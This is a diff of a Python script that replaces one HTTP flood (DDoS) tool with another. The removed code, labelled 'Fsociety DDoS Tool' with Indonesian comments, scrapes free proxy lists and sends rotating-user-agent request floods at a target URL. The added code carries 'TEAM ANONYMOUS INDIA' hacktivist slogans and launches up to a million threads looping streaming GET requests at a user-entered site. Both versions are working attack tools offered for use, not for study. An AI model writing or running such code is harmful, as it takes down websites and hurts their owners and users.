@@ -1,15 +1,40 @@
-import sys
 import requests
-import asyncio
-import aiohttp
-import random
-from bs4 import BeautifulSoup
-from datetime import datetime
+import concurrent.futures
+import sys
 import time
+from time import sleep
+from pystyle import *
 import os
+ 
+ 
+osystem = sys.platform
 
-# ASCII Art
-ASCII_ART = """
+if osystem == "linux":
+  os.system("clear")
+else:
+  os.system("cls")
+print("""
+Welcome Sir,
+
+> TEAM ANONYMOUS INDIA Rule The World.
+> We are Anonymous. 
+> We are Legion. 
+> We do not Forgive. 
+> We do not Forget.
+
+> EXPECT US!
+
+""")
+
+time.sleep(2.5)
+
+if osystem == "linux":
+  os.system("clear")
+else:
+  os.system("cls")
+  
+time.sleep(1)
+ascii = r'''
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣦⣤⣴⣤⣤⣄⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⣻⣿⣦⣀⠀⢀⣀⣀⣏⣹⠀
 ⢠⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠭⠭⠽⠽⠿⠿⠭⠭⠭⠽⠿⠿⠛
@@ -24,290 +49,28 @@ ASCII_ART = """
         
        DEVELOPER : SABIT | HydraKraken | 𝗧𝗘𝗔𝗠 𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗜𝗡𝗗𝗜𝗔
        GITHUB : https://github.com/TEAM-ANONYMOUS-INDIA                                                 
-                                                                                                       
-                                                                              
-                                                                                                                                                                          
-"""
+                                                                                     
+                  
+ '''
+banner = r"""
+v2 """.replace('â', 'â')
+banner = Add.Add(ascii, banner, center=True)
+print(Colorate.Horizontal(Colors.red_to_blue, banner))
 
-# Konfigurasi dasar
-DEFAULT_REQUESTS = 1000
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-]
+a = input(str("{+} Enter Web Url : "))
+time.sleep(2.5)
+print("Started...")
+url = a
 
-# Daftar sumber proxy
-PROXY_SOURCES = [
-    "https://www.us-proxy.org",
-    "https://www.socks-proxy.net",
-    "https://proxyscrape.com/free-proxy-list",
-    "https://www.proxynova.com/proxy-server-list/",
-    "https://proxybros.com/free-proxy-list/",
-    "https://proxydb.net/",
-    "https://spys.one/en/free-proxy-list/",
-    "https://hasdata.com/free-proxy-list",
-    "https://www.proxyrack.com/free-proxy-list/",
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-]
+def send_request(url):
+    with requests.Session() as session:
+        while True:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36","User-Agent": "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36","User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0","User-Agent": "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0","User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36","User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6","User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)","User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10","User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3","User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;","User-Agent": "Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)","User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)","User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27","User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0","User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36","User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)","User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0","User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)","User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0)  Gecko/20100101 Firefox/18.0","User-Agent": "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00","User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36","User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36","User-Agent": "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17","User-Agent": "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01","User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0","User-Agent": "Mozilla/5.0 (Windows x86; rv:19.0) Gecko/20100101 Firefox/19.0","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0","User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36","User-Agent": "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36","User-Agent": "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205","User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0","User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36","User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)","User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27","User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15","User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17","User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
+            }
+            response = session.get(url, headers=headers, stream=True)
+            for chunk in response.iter_content(chunk_size=102400):
+                pass
 
-# Fungsi untuk mendapatkan daftar proxy dari sumber online
-async def fetch_proxies(source):
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(source) as response:
-                if response.status == 200:
-                    html = await response.text()
-                    # Sesuaikan parsing HTML berdasarkan sumber
-                    if "us-proxy.org" in source or "socks-proxy.net" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'id': 'proxylisttable'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "proxyscrape.com" in source:
-                        proxies = html.strip().split('\r\n')
-                        return ["http://" + proxy for proxy in proxies]
-                    elif "proxynova.com" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'id': 'tbl_proxy_list'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "proxybros.com" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'class': 'table'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "proxydb.net" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'class': 'table table-sm'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "spys.one" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'class': 'spy1xx'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "freeproxy.world" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'class': 'table table-striped table-bordered'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "hasdata.com" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'class': 'proxies'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "proxyrack.com" in source:
-                        soup = BeautifulSoup(html, 'html.parser')
-                        proxy_table = soup.find('table', {'class': 'table table-striped'})
-                        proxies = []
-                        for row in proxy_table.find_all('tr')[1:]:
-                            columns = row.find_all('td')
-                            ip = columns[0].text.strip()
-                            port = columns[1].text.strip()
-                            proxies.append(f"http://{ip}:{port}")
-                        return proxies
-                    elif "api.proxyscrape.com" in source:
-                         proxies = html.strip().split('\r\n')
-                         return proxies
-                    else:
-                        print(f"Tidak dapat memproses sumber proxy: {source}")
-                        return []
-                else:
-                    print(f"Failed to fetch proxies from {source}. Status code: {response.status}")
-                    return []
-    except Exception as e:
-        print(f"Error fetching proxies from {source}: {e}")
-        return []
-
-# Fungsi untuk mengumpulkan proxy dari semua sumber
-async def get_all_proxies():
-    all_proxies = []
-    for source in PROXY_SOURCES:
-        proxies = await fetch_proxies(source)
-        if proxies:
-            all_proxies.extend(proxies)
-            print(f"Berhasil mengambil {len(proxies)} proxy dari {source}")
-        else:
-            print(f"Gagal mengambil proxy dari {source}")
-    return all_proxies
-
-# Fungsi untuk membersihkan layar
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-# Fungsi untuk menampilkan progres loading (diperbarui untuk kecepatan)
-def show_progress(progress, total=100, length=50):
-    percent = (progress / float(total)) * 100
-    bar = '#' * int(length * progress / float(total))
-    spaces = ' ' * (length - len(bar))
-    print(f'\r[{bar}{spaces}] {percent:.2f}%', end='', flush=True)  # Menggunakan print langsung
-
-# Fungsi untuk melakukan serangan DDoS (dipercepat)
-async def attack(url, session, stealth_mode, proxy=None):
-    headers = {'User-Agent': random.choice(USER_AGENTS)}
-    try:
-        if proxy:
-            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as response:  # Mengurangi timeout
-                return "Berhasil"
-        else:
-            async with session.get(url, headers=headers, timeout=5) as response:  # Mengurangi timeout
-                return "Berhasil"
-    except:
-        return "Gagal"
-
-# Fungsi utama untuk menjalankan serangan secara bersamaan (dipercepat)
-async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
-    clear_screen()
-    print(ASCII_ART)  # Cetak ASCII art sebelum pesan serangan
-
-    print(f"Menyerang {url} dengan {num_requests} permintaan...\n")
-
-    success_count = 0
-    failure_count = 0
-    start_time = time.time()
-
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for i in range(num_requests):
-            proxy = random.choice(proxies) if proxies else None
-            task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
-            tasks.append(task)
-
-            if len(tasks) >= 500:  # Batasi jumlah tugas untuk mencegah kelebihan beban
-                results = await asyncio.gather(*tasks)
-                success_count += results.count("Berhasil")
-                failure_count += results.count("Gagal")
-                tasks = []  # Reset daftar tugas
-                show_progress((i + 1) / num_requests * 100)  # Tampilkan progres
-
-        # Proses tugas yang tersisa
-        if tasks:
-            results = await asyncio.gather(*tasks)
-            success_count += results.count("Berhasil")
-            failure_count += results.count("Gagal")
-            show_progress(100)  # Pastikan progres mencapai 100%
-
-    end_time = time.time()
-    elapsed_time = end_time - start_time
-
-    print("\n\n===== 💣Laporan Serangan💣 =====")
-    print(f"URL Target: {url}")
-    print(f"Jumlah Permintaan: {num_requests}")
-    print(f"Serangan Berhasil: {success_count}")
-    print(f"Serangan Gagal: {failure_count}")
-    print(f"Waktu yang dihabiskan: {elapsed_time:.2f} detik")
-    print("==========================")
-
-# Fungsi untuk menampilkan menu dan mendapatkan input dari pengguna
-def show_menu():
-    print("\n===== 🎭Fsociety DDoS Tool🎭 =====")
-    print("1. Target URL")
-    print("2. Threads (Default: {})".format(DEFAULT_REQUESTS))
-    print("3. Stealth Mode (At the moment: {})".format("Active" if stealth_mode else "NonActive"))
-    print("4. Proxy (At the moment: {})".format("Active" if use_proxy else "NonActive"))
-    print("5. Attack")
-    print("6. Exit")
-    print("===============================")
-    print("CHOICE : ")
-    choice = input("Select an option: ")
-    return choice
-
-# Variabel global untuk menyimpan opsi
-url = None
-num_requests = DEFAULT_REQUESTS
-stealth_mode = False
-use_proxy = False
-proxies = []  # Daftar proxy yang akan digunakan
-ascii_printed = False  # Tambahkan variabel untuk melacak apakah ASCII sudah dicetak
-
-# Fungsi utama yang memproses menu dan memulai serangan
-def main():
-    global url, num_requests, stealth_mode, use_proxy, proxies, ascii_printed
-
-    if not ascii_printed:  # Cetak ASCII hanya sekali
-        print(ASCII_ART)
-        ascii_printed = True
-
-    while True:
-        choice = show_menu()
-
-        if choice == '1':
-            url = input("Enter Target URL: ")
-        elif choice == '2':
-            try:
-                num_requests = int(input("Enter Request Amount: "))
-            except ValueError:
-                print("Input tidak valid. Menggunakan jumlah permintaan default.")
-                num_requests = DEFAULT_REQUESTS
-        elif choice == '3':
-            stealth_mode = not stealth_mode
-            print("Stealth Mode sekarang: {}".format("Active" if stealth_mode else "NonActive"))
-        elif choice == '4':
-            use_proxy = not use_proxy
-            print("Penggunaan Proxy sekarang: {}".format("Active" if use_proxy else "NonActive"))
-            if use_proxy:
-                print("Mengambil daftar proxy...")
-                proxies = asyncio.run(get_all_proxies())
-                if proxies:
-                    print(f"Berhasil mengambil {len(proxies)} proxy.")
-                else:
-                    print("Gagal mengambil proxy. Serangan akan dilanjutkan tanpa proxy.")
-                    use_proxy = False
-            else:
-                proxies = []
-        elif choice == '5':
-            if not url:
-                print("Target URL has not been entered. Please enter the URL first.")
-            else:
-                clear_screen()  # Bersihkan layar sebelum mencetak ASCII
-                print(ASCII_ART) # Cetak ASCII art di interface kedua
-                print("Memulai serangan...")
-                asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
-                print("Serangan selesai.")
-        elif choice == '6':
-            print("\n--GOOD BYE FRIEND--")
-            break
-        else:
-            print("Invalid option. Please try again.")
-
-if __name__ == "__main__":
-    main()
+with concurrent.futures.ThreadPoolExecutor(max_workers=1000000) as executor:
+    results = executor.map(send_request, [url] * 10000000)
